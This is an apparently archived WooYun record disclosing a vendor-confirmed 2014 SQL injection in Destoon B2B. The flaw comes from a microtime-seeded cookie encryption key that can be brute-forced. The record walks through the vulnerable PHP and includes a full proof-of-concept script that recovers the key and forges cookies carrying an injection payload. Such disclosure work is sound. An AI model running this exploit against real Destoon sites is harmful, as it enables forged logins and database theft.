{"id": 1828, "wybug_id": "wooyun-2014-062391", "wybug_title": "Destoon B2B 2014-05-21最新版绕过全局防御暴力注入（官方Demo可重现）", "wybug_corp": "DESTOON", "wybug_author": "索马里的海贼", "wybug_date": "2014-05-26 16:42", "wybug_open_date": "2014-08-24 16:44", "wybug_type": "SQL注射漏洞", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": "", "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2014-05-26：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2014-05-29：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2014-06-01：\t细节向第三方安全合作伙伴开放\t\t\t\t\t\t\t\t\t2014-07-23：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2014-08-02：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2014-08-12：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2014-08-24：\t细节向公众公开  简要描述： destoon某加密函数缺陷可破解导致注入由于字符串加密，所以自带的全局strip_sql gpc等直接无视了使用不安全的“随机数”的实例搬个小凳子吧，这个一时半会儿说不完。。。 详细说明：  出问题的是用于cookie加解密的encrypt和decrypt函数首先看一下函数内容include/global.func.php 122行\nfunction encrypt($txt, $key = '') {\t$key or $key = DT_KEY; //DT_KEY是在安装时生成的一个15位随机字符串\t$rnd = md5(microtime());//缺陷 下面说\t$len = strlen($txt);\t$ren = strlen($rnd);\t$ctr = 0;\t$str = '';\tfor($i = 0; $i < $len; $i++) {\t\t$ctr = $ctr == $ren ? 0 : $ctr;\t\t$str .= $rnd[$ctr].($txt[$i] ^ $rnd[$ctr++]); //只是简单的按位异或\t}\treturn str_replace('=', '', base64_encode(kecrypt($str, $key)));}function decrypt($txt, $key = '') {\t$key or $key = DT_KEY; //这里才用到key\t$txt = kecrypt(base64_decode($txt), $key);\t$len = strlen($txt);\t$str = '';\tfor($i = 0; $i < $len; $i++) {\t\t$tmp = $txt[$i];\t\t$str .= $txt[++$i] ^ $tmp; //也是异或\t}\treturn $str;}\n粗看有随机数、有随机时间值、还做md5hash再异或好像很安全的样子因为有两个未知key md5(microtime())和DT_KEY等等 真的是两个么？搜一下microtime()的定义定义和用法microtime() 函数返回当前 Unix 时间戳和微秒数。例子\n<?phpecho(microtime());?>\n输出\n0.25139300 1138197510\n时间戳好说 http头中有个date值就是，微秒嘛后面两位固定为00前面有6位不可预知6位也就是100W个可能，只要穷举100W次肯定有一次是正确的key（不要被100W吓到，本地跑起来是很快的）再来看encrypt函数 简单表示一下 加密前的原文txt = amicrotime生成的key = bmd5(DT_KEY) = c最后生成的密文 = d整个流程简单来说就是 \na^b = xx^c = d\n现在b是已知的 如果能找到一个原文和密文的对照 也就是a和d那就可以通过abd来推算出c 也就是keydestoon很贴心的写了一段正好符合要求的代码include/module.func.php 140行\nfunction anti_spam($string) {\tglobal $MODULE, $DT;\tif($DT['anti_spam'] && preg_match(\"/^[a-z0-9_@\\-\\s\\/\\.\\,\\(\\)\\+]+$/i\", $string)) {\t\tdo {\t\t\t$tmp = encrypt($string); //加密\t\t\tif(strpos($tmp, '0x') === false) break;\t\t} while(1);\t\treturn '<img src=\"'.$MODULE[3]['linkurl'].'image.php?auth='.rawurlencode($tmp).'\" align=\"absmddle\"/>';//输出\t} else {\t\treturn $string;\t}}\n这个函数的功能是“将电话、传真、Email等重要信息显示为图片格式，防止采集和复制”调用示范\n{if $member[mail]}<li><span>邮件</span>{anti_spam($member[mail])}</li>{/if}{if $member[telephone]}<li><span>电话</span>{anti_spam($member[telephone])}</li>{/if}{if $member[fax]}<li><span>传真</span>{anti_spam($member[fax])}</li>{/if}\n没有比这个更好的输出点了，没有任何干扰。这里拿官方demo做演示，随便找家公司查看联系方式http://testfree1.demo.destoon.com/contact/\n\nMon, 26 May 2014 07:12:43 GMT 转成unix时间戳并加8个小时为1401088363\n\n运气不错 15W多次就出来了 总共脚本运行时间大概就2秒到这里 我们已经拿到了MD5后的DT_KEY，那么怎么来用这个key呢跑MD5来还原真实的KEY也是一种思路，不过15位大小写+数字的彩虹表还是蛮大的。回去搜了一下encrypt和decrypt函数的调用，找到了cookie的加解密module/member/member.class.php 行376\n$auth = encrypt($user['userid'].\"\\t\".$user['username'].\"\\t\".$user['groupid'].\"\\t\".$user['password'].\"\\t\".$user['admin'], md5(DT_KEY.$_SERVER['HTTP_USER_AGENT']));set_cookie('auth', $auth, $cookietime);set_cookie('userid', $user['userid'], $cookietime);set_cookie('username', $user['username'], $DT_TIME + 86400*365);\n登录完成后setcookie的地方，可以看到 cookie是用 userid{制表符}username{制表符}groupid{制表符}password{制表符}admin拼起来然后用md5(DT_KEY+useragent)作为密钥用encrypt函数做加密的小伙伴们都知道 user-agent是客户端提交的，如果我提交个空的user-agent,cookie就会用md5(DT_KEY)作为密钥，是不是很眼熟呢，这个就是我们上一步跑出来的东西。现在我们已经可以伪造出任意合法的cookie了，一般到这里漏洞就要结束了可惜destoon没想那么简单（已经很麻烦了）把rank给我，我们来看看cookie的验证过程/common.inc.php行135\n$destoon_auth = get_cookie('auth');if($destoon_auth) {\t\t$_dauth = explode(\"\\t\", decrypt($destoon_auth, md5(DT_KEY.$_SERVER['HTTP_USER_AGENT'])));//解密也是用的DT_KEY+user-agent\t$_userid = isset($_dauth[0]) ? intval($_dauth[0]) : 0;\t$_username = isset($_dauth[1]) ? trim($_dauth[1]) : '';\t$_groupid = isset($_dauth[2]) ? intval($_dauth[2]) : 3;\t$_admin = isset($_dauth[4]) ? intval($_dauth[4]) : 0;\tif($_userid && !defined('DT_NONUSER')) {\t\t$_password = isset($_dauth[3]) ? trim($_dauth[3]) : '';\t\t$USER = $db->get_one(\"SELECT username,passport,company,truename,password,groupid,email,message,chat,sound,online,sms,credit,money,loginip,admin,aid,edittime,trade FROM {$DT_PRE}member WHERE userid=$_userid\");\t\tif($USER && $USER['password'] == $_password) {\t\t//居然验证密码了...cookie伪造在这里失败了\n不死心继续搜索decrypt的调用，终于又发现了一个问题module/member/admin.inc.php\n<?php defined('IN_DESTOON') or exit('Access Denied');$admin_user = false;if($_groupid == 1) {\t$admin_user = decrypt(get_cookie('admin_user'));\tif($admin_user) {\t\t$_USER = explode('|', $admin_user); //cookie格式 uid|uname\t\tif($_username = $_USER[1]) {\t\t\t$userid = $_USER[0];// userid来自cookie 且经过decrypt 无视防御\t\t\t$USER = $db->get_one(\"SELECT username,passport,company,truename,password,groupid,email,message,chat,sound,online,sms,credit,money,loginip,admin,aid,edittime,trade FROM {$DT_PRE}member WHERE userid=$userid\");//userid直接进sql\t\t\tif($USER) {\t\t\t\t$_userid = $userid;\t\t\t\textract($USER, EXTR_PREFIX_ALL, '');\t\t\t\t$MG = cache_read('group-'.$_groupid.'.php');\t\t\t\t$admin_user = true;\t\t\t}\t\t}\t}}?>\n很明显的一个注入点，虽然Destoon默认不开启DEBUG，不显示错误信息，但我们一样可以用时间延迟来注入。来看看注入的条件，首先进入查询的前提是$_groupid == 1来看这个文件的调用，还是在/common.inc.php行135\n$destoon_auth = get_cookie('auth');if($destoon_auth) {\t\t$_dauth = explode(\"\\t\", decrypt($destoon_auth, md5(DT_KEY.$_SERVER['HTTP_USER_AGENT'])));\t$_userid = isset($_dauth[0]) ? intval($_dauth[0]) : 0;\t$_username = isset($_dauth[1]) ? trim($_dauth[1]) : '';\t$_groupid = isset($_dauth[2]) ? intval($_dauth[2]) : 3; //来自cookie 可以伪造\t$_admin = isset($_dauth[4]) ? intval($_dauth[4]) : 0;\tif($_userid && !defined('DT_NONUSER')) {\t//如果进入这个if就失败\t\t$_password = isset($_dauth[3]) ? trim($_dauth[3]) : '';\t\t$USER = $db->get_one(\"SELECT username,passport,company,truename,password,groupid,email,message,chat,sound,online,sms,credit,money,loginip,admin,aid,edittime,trade FROM {$DT_PRE}member WHERE userid=$_userid\");\t\tif($USER && $USER['password'] == $_password) { \t\t\tif($USER['groupid'] == 2) dalert(lang('message->common_forbidden'));\t\t\textract($USER, EXTR_PREFIX_ALL, ''); //伪造的groupid被覆盖\t\t\tif($USER['loginip'] != $DT_IP && ($DT['ip_login'] == 2 || ($DT['ip_login'] == 1 && IN_ADMIN))) {\t\t\t\t$_userid = 0; set_cookie('auth', '');\t\t\t\tdalert(lang('message->common_login', array($USER['loginip'])), DT_PATH);\t\t\t}\t\t} else {\t\t\t$_userid = 0; //置0\t\t\tif($db->linked && !isset($swfupload) && strpos($_SERVER['HTTP_USER_AGENT'], 'Flash') === false) set_cookie('auth', '');\t\t}\t\tunset($destoon_auth, $USER, $_dauth, $_password);\t}}if($_userid == 0) { $_groupid = 3; $_username = ''; } //如果userid==0就设置groupid为3 if(!IN_ADMIN) {\tif($_groupid == 1) include DT_ROOT.'/module/member/admin.inc.php'; //如果到了这里$_groupid还是1 就包含\n这个地方纠结很久 差点都放弃了 不管cookie里userid和groupid改成什么只要流程进了第一个if就废了userid跟password匹配的话,groupid就会被extract覆盖,userid跟password不匹配的话进入else userid会被置0不进入这个if的方法 一是userid为false 二就是NT_NONUSER，搜了一下发现一个很合适的文件。api/js.php\ndefine('DT_NONUSER', true);\t\t//符合要求if($_SERVER['QUERY_STRING']) {\t$exprise = isset($_GET['tag_expires']) ? intval($_GET['tag_expires']) : 0;\t$moduleid = isset($_GET['moduleid']) ? intval($_GET['moduleid']) : 0;\t$moduleid > 3 or exit('document.write(\"<h2>Bad Parameter</h2>\");');\t//moduleid<3会退出\t$tag = $_SERVER['QUERY_STRING'];\t$_SERVER['QUERY_STRING'] = $_SERVER['REQUEST_URI'] = '';\tforeach($_GET as $k=>$v) { unset($$k); }\t$_GET = array();\trequire '../common.inc.php'; //包含了！\theader(\"Content-type:text/javascript\");\t\t($DT['jstag'] && $DT['safe_domain'] && check_referer()) or exit('document.write(\"<h2>Invalid Referer</h2>\");');\n只要get moduleid>3就能带着我们的DT_NONUSER包含common.inc.php从而进入admin.inc.php的包含最终实现注入了   漏洞证明：  1、首先随便找个公司主页查看联系方式，需要记录3样东西：时间戳、原文、密文2、将以上信息填入POC，运行POC获取cookie\n\n3、用上一步生成的cookie去访问/api/js.php?moduleid=5，记得user-agent要设置为空为了方便演示我这里把debug打开了 报错信息里能看到我们的注入语句\n\npoc:(这个poc还有很多问题，比如它获取第一个符合正则的key就停止了 事实上有可能会碰上正好符合正则却不是真正key的情况，只要多获取几组数据看相同的就能找出真正的md5(DT_KEY))\n<?phpprintf(\"---------------------------------------------------Destoon B2B V5.0 weak encryption VulnerabilityAuthor: MattE-mail: root@qaz.me---------------------------------------------------\\n\\n\");$time = \"1401088826\";//服务器返回的时间 记得GMT要加8小时$txt  = \"admin88@baidu.com\";//原始文本$result = \"WWFfPgdtWGcAbwJtCmNVQFc0VDRRaQNqDSZSeF1nVWVTZw\";//密文$md5key = crack($time,$txt,$result);echo \"[+]key found:\".$md5key.\"\\n\";echo \"[+]------------------------------------------------\\n\";echo \"[+]Cookie:\\n\";//以下这些除了uid和groupid其它都无所谓$uid = \"1\";$uname = \"matt\";$groupid = \"1\"; //groupid = 1 包含$password = \"asdf\";$admin = \"0\";$cookie = $uid.\"\\t\".$uname.\"\\t\".$groupid.\"\\t\".$password.\"\\t\".$admin;$admin_user = '1xxxxx\\'|asdf'; // “|”前写注入语句echo \"coe_auth=\".encrypt($cookie, $md5key);echo \";coe_admin_user=\".encrypt($admin_user, $md5key, '1').\"\\n\";function decrypt($txt, $key = '') {\t$txt = kecrypt(base64_decode($txt), $key);\t$len = strlen($txt);\t$str = '';\tfor($i = 0; $i < $len; $i++) {\t\t$tmp = $txt[$i];\t\t$str .= $txt[++$i] ^ $tmp;\t}\treturn $str;}function encrypt($txt, $key = '',$md5 = '0') {\t$rnd = md5(microtime());\t$len = strlen($txt);\t$ren = strlen($rnd);\t$ctr = 0;\t$str = '';\tfor($i = 0; $i < $len; $i++) {\t\t$ctr = $ctr == $ren ? 0 : $ctr;\t\t$str .= $rnd[$ctr].($txt[$i] ^ $rnd[$ctr++]);\t}\treturn str_replace('=', '', base64_encode(kecrypt($str, $key, $md5)));}function kecrypt($txt, $key, $md5) {\t$key = $md5 == \"0\" ? md5($key) : $key;\t$len = strlen($txt);\t$ken = strlen($key);\t$ctr = 0;\t$str = '';\tfor($i = 0; $i < $len; $i++) {\t\t$ctr = $ctr == $ken ? 0 : $ctr;\t\t$str .= $txt[$i] ^ $key[$ctr++];\t}\treturn $str;}function crack($time,$txt,$result){\tfor ($a=1; $a < 999999; $a++) {\t\tif ($a%10000 == 0) {\t\t\techo \".\";\t\t}\t\tif ($a%100000 == 0) {\t\t\techo $a.\"\\n\";\t\t}\t\t$m = str_repeat(0, 6 - strlen($a)).$a;\t\t$rnd = md5(\"0.\".$m.\"00 \".$time);\t\t$len = strlen($txt);\t\t$ren = strlen($rnd);\t\t$ctr = 0;\t\t$str = '';\t\tfor($i = 0; $i < $len; $i++) {\t\t\t$ctr = $ctr == $ren ? 0 : $ctr;\t\t\t$str .= $rnd[$ctr].($txt[$i] ^ $rnd[$ctr++]);\t\t}\t\t$key = '';\t\t$tmp = base64_decode($result);\t\t$x = 0 ;\t\tfor ($k=0; $k < strlen($tmp); $k++) { \t\t\t$x = $x == 32 ? 0 : $x;\t\t\t$key .= $tmp[$k] ^ $str[$x++];\t\t}\t\tif (preg_match(\"/[a-f,0-9]{32,}/\", $key)) {\t\t\techo \"$a\\n\";\t\t\treturn substr($key, 0,32);\t\t\tbreak;\t\t}\t}}?>\n   修复方案：  microtime不安全   版权声明：转载请注明来源 索马里的海贼@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：高 漏洞Rank：15  确认时间：2014-05-29 11:00 厂商回复： 感谢反馈 我们会尽快修复 最新状态： 暂无  ", "replys": "漏洞评价：\n评论\n     2014-05-26 17:51 |    \t\tU神 \t\t\t( 核心白帽子 |\t\t\t        Rank:1285 漏洞数:142        | 感谢乌云，知恩不忘，其实我一直都在乌云默...)\t\t \n  就拿英文来说吧，好歹是大学生，三个字“JJ Fly”（屌飞了）    \n     2014-05-26 17:57 |    \t\tmramydnei \t\t\t( 普通白帽子  |\t\t\t        Rank:348 漏洞数:80        )\t\t \n  鲁大师发飙了啊    \n     2014-05-26 17:58 |    \t\tphith0n  \t\t\t( 核心白帽子 |\t\t\t        Rank:656 漏洞数:107        | 一个想当文人的黑客~)\t\t \n  我前段时间也注意了。。但我不会啊，他那加密算法太坑了，不过我不会分析算法。。。弄了半天没出来，就放弃了。。。    \n     2014-05-26 17:59 |    \t\t′  雨。 \t\t\t( 普通白帽子  |\t\t\t        Rank:1231 漏洞数:190        | Only Code Never Lie To Me.)\t\t \n  @phith0n   师傅 继续带我分析    \n     2014-05-26 18:30 |    \t\t索马里的海贼 \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:24        | http://tieba.baidu.com/f?kw=WOW)\t\t \n  @mramydnei 嘘。。。不是我。。    \n     2014-05-26 18:31 |    \t\t索马里的海贼 \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:24        | http://tieba.baidu.com/f?kw=WOW)\t\t \n  @phith0n 算法出来实际利用也是一个坑啊。。。一把辛酸泪，差点就放弃了    \n     2014-05-26 18:33 |    \t\tmramydnei \t\t\t( 普通白帽子  |\t\t\t        Rank:348 漏洞数:80        )\t\t \n  @索马里的海贼 haha    \n     2014-05-26 19:39 |    \t\tsecgov \t\t\t( 路人 |\t\t\t        Rank:10 漏洞数:3        | 安全审计，漏洞挖掘,WAF. 揭露漏洞有风险，...)\t\t \n  这个程序漏洞还真 多    \n     2014-05-29 14:53 |    \t\t小红猪 \t\t\t( 普通白帽子  |\t\t\t        Rank:194 漏洞数:30        | Wow~~~哈哈~~~)\t\t \n  搬个小凳子吧，这个一时半会儿说不完。。。 O(∩_∩)O哈哈~    \n     2014-06-25 09:21 |    \t\txfkxfk  \t\t\t( 核心白帽子 |\t\t\t        Rank:2179 漏洞数:338        | 呵呵！)\t\t \n  不错哦，给力    \n     2014-06-25 09:25 |    \t\t索马里的海贼 \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:24        | http://tieba.baidu.com/f?kw=WOW)\t\t \n  @xfkxfk 大神你就不要笑话我了    \n     2014-06-25 09:31 |    \t\txfkxfk  \t\t\t( 核心白帽子 |\t\t\t        Rank:2179 漏洞数:338        | 呵呵！)\t\t \n  @索马里的海贼 看了几个你对算法问题漏洞的分析，挺不错哦，顶个！    \n     2014-06-25 10:06 |    \t\t索马里的海贼 \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:24        | http://tieba.baidu.com/f?kw=WOW)\t\t \n  @xfkxfk 算法问题坑脑细胞，好几天没睡好了    \n     2014-06-25 10:09 |    \t\t小川  \t\t\t( 核心白帽子 |\t\t\t        Rank:1344 漏洞数:216        | 一个致力要将乌云变成搞笑论坛的男人)\t\t \n  @索马里的海贼 真是太精彩了    \n     2014-06-25 10:33 |    \t\t索马里的海贼 \t\t\t( 普通白帽子  |\t\t\t        Rank:254 漏洞数:24        | http://tieba.baidu.com/f?kw=WOW)\t\t \n  @小川 补个闪电？    \n     2014-06-25 13:16 |    \t\tpandas \t\t\t( 普通白帽子  |\t\t\t        Rank:585 漏洞数:58        | 国家一级保护动物)\t\t \n  原来这才是真正的matt    \n     2014-08-24 19:18 |    \t\tloopx9 \t\t\t( 核心白帽子 |\t\t\t        Rank:602 漏洞数:62        | ..)\t\t \n  @索马里的海贼 看了官方补丁，microtime改成了随机字符串，发现还可以破解出异或key，但找不到利用的地方。解密之后都intval了。    \n  \n\n\n", "wybug_level_fromcorp": "高", "wybug_rank_fromcorp": 15, "Ranks": null}